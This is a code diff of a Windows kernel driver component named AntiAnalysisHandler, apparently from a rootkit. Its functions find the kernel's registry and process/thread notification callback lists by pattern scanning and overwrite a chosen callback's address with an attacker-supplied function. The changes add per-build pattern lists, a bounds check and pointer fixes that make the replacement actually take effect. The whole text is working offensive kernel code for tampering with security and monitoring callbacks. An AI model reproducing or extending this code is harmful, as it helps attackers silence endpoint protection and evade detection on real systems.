@@ -334,7 +334,8 @@ NTSTATUS AntiAnalysisHandler::ListRegistryCallbacks(_Inout_ IoctlCallbackList<Cm
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS AntiAnalysisHandler::ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlCallbackList<CmCallback>* callbacks,
-	_In_opt_ ULONG64 replacerFunction, _In_opt_ ULONG64 replacedFunction) {
+	_In_opt_ ULONG64 replacerFunction, 
+	_In_opt_ ULONG64 replacedFunction) {
 	MemoryGuard guard;
 	NTSTATUS status = STATUS_SUCCESS;
 	PCM_CALLBACK currentCallback = NULL;
@@ -381,8 +382,11 @@ NTSTATUS AntiAnalysisHandler::ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlC
 
 		PUCHAR callbacksList = searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;
 
-		searchedRoutineOffset = static_cast<PLONG>(FindPattern(RoutinesListCountPattern, searchedRoutineAddress,
-			targetFunctionDistance, &foundIndex));
+		searchedRoutineOffset = static_cast<PLONG>(FindPatterns(RoutinesListCountPatterns,
+			RoutinesListCountPatternsCount,
+			searchedRoutineAddress,
+			targetFunctionDistance, 
+			&foundIndex));
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
@@ -500,14 +504,16 @@ NTSTATUS AntiAnalysisHandler::ListPsNotifyRoutines(_Inout_ IoctlCallbackList<PsR
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS AntiAnalysisHandler::ListAndReplacePsNotifyRoutines(_Inout_opt_ IoctlCallbackList<PsRoutine>* callbacks,
-	_In_opt_ ULONG64 replacerFunction, _In_opt_ ULONG64 replacedFunction) {
+	_In_opt_ ULONG64 replacerFunction, 
+	_In_opt_ ULONG64 replacedFunction) {
 	MemoryGuard guard;
 	NTSTATUS status = STATUS_SUCCESS;
 	PVOID searchedRoutineAddress = NULL;
 	ULONG foundIndex = 0;
 	SIZE_T targetFunctionDistance = 0;
 	SIZE_T listDistance = 0;
-	ULONG64 currentRoutine = 0;
+	ULONG64 currentRoutineAddress = 0;
+	PPS_ROUTINE currentRoutine = nullptr;
 	errno_t err = 0;
 	char* driverName = nullptr;
 	Pattern listSignature = { 0 };
@@ -559,66 +565,94 @@ NTSTATUS AntiAnalysisHandler::ListAndReplacePsNotifyRoutines(_Inout_opt_ IoctlCa
 		return status;
 	SIZE_T countOffset = RoutinesListOffset;
 
-	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern, searchedRoutineAddress,
-		targetFunctionDistance, &foundIndex));
+	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern, 
+		searchedRoutineAddress,
+		targetFunctionDistance, 
+		&foundIndex));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
-	searchedRoutineAddress = static_cast<PUCHAR>(searchedRoutineAddress) + *(searchedRoutineOffset) + foundIndex + 
+	searchedRoutineAddress = static_cast<PUCHAR>(searchedRoutineAddress) + 
+		*(searchedRoutineOffset) + 
+		foundIndex + 
 		CallFunctionOffset;
 
-	PLONG routinesListOffset = static_cast<PLONG>(FindPattern(listSignature, searchedRoutineAddress,
-		listDistance, &foundIndex));
+	PLONG routinesListOffset = static_cast<PLONG>(FindPattern(listSignature, 
+		searchedRoutineAddress,
+		listDistance, 
+		&foundIndex));
 
 	if (!routinesListOffset)
 		return STATUS_NOT_FOUND;
 
-	PUCHAR routinesList = static_cast<PUCHAR>(searchedRoutineAddress) + *(routinesListOffset) + foundIndex + RoutinesListOffset;
+	PULONG64 routinesList = reinterpret_cast<PULONG64>(static_cast<PUCHAR>(searchedRoutineAddress) +
+		*(routinesListOffset) + 
+		foundIndex + 
+		RoutinesListOffset);
 
-	PLONG routinesLengthOffset = static_cast<PLONG>(FindPattern(RoutinesListCountPattern, searchedRoutineAddress,
-		listDistance, &foundIndex));
+	PLONG routinesLengthOffset = static_cast<PLONG>(FindPatterns(RoutinesListCountPatterns,
+		RoutinesListCountPatternsCount,
+		searchedRoutineAddress,
+		listDistance, 
+		&foundIndex));
 
 	if (!routinesLengthOffset)
 		return STATUS_NOT_FOUND;
 
-	if (callbacks->Type == PsCreateProcessType)
-		countOffset = PsNotifyRoutinesRoutineCountOffset;
+	if (callbacks->Type == PsCreateProcessType) {
+		for (Pattern pattern : RoutinesListCountPatterns) {
+			countOffset = pattern.GetOffsetForVersion(WindowsBuildNumber);
+
+			if (countOffset != 0)
+				break;
+		}
+	}
 	else if (callbacks->Type == PsCreateThreadTypeNonSystemThread)
 		countOffset = PsNotifyRoutinesRoutineCountOffset;
 
-	ULONG routinesCount = *reinterpret_cast<PULONG>(static_cast<PUCHAR>(searchedRoutineAddress) + *(routinesLengthOffset) +
-		foundIndex + countOffset);
+	ULONG routinesCount = *reinterpret_cast<PULONG>(static_cast<PUCHAR>(searchedRoutineAddress) + 
+		*(routinesLengthOffset) +
+		foundIndex + 
+		countOffset);
+
+	if (routinesCount > MAX_ROUTINES) {
+		status = STATUS_UNSUCCESSFUL;
+		return status;
+	}
 
 	if (callbacks && callbacks->Count != routinesCount) {
 		callbacks->Count = routinesCount;
 		return status;
 	}
 	if (callbacks && callbacks->Callbacks) {
-		status = ProbeAddress(callbacks->Callbacks, routinesCount * sizeof(PsRoutine),
-			routinesCount * sizeof(PsRoutine));
+		status = ProbeAddress(callbacks->Callbacks, 
+			routinesCount * sizeof(PsRoutine),
+			__alignof(PsRoutine*));
 
 		if (!NT_SUCCESS(status)) {
 			callbacks->Count = routinesCount;
 			return status;
 		}
 		if (!guard.GuardMemory(callbacks->Callbacks,
-			routinesCount * sizeof(PsRoutine), UserMode)) {
+			routinesCount * sizeof(PsRoutine), 
+			UserMode)) {
 			return STATUS_INSUFFICIENT_RESOURCES;
 		}
 	}
 
 	for (ULONG i = 0; i < routinesCount; i++) {
-		currentRoutine = *reinterpret_cast<PULONG64>(routinesList[i * 8]);
-		currentRoutine &= ROUTINE_MASK;
+		currentRoutineAddress = routinesList[i];
+		currentRoutineAddress &= ROUTINE_MASK;
+		currentRoutine = reinterpret_cast<PPS_ROUTINE>(currentRoutineAddress);
 
-		if (currentRoutine == replacedFunction) {
-			currentRoutine = replacerFunction;
+		if (currentRoutine->RoutineAddress == replacedFunction) {
+			currentRoutine->RoutineAddress = replacerFunction;
 			break;
 		}
 
-		if (callbacks) {
-			callbacks->Callbacks[i].CallbackAddress = *reinterpret_cast<PULONG64>(currentRoutine);
+		if (callbacks && callbacks->Callbacks) {
+			callbacks->Callbacks[i].CallbackAddress = currentRoutine->RoutineAddress;
 
 			__try {
 				driverName = MatchCallback(reinterpret_cast<PVOID>(callbacks->Callbacks[i].CallbackAddress));
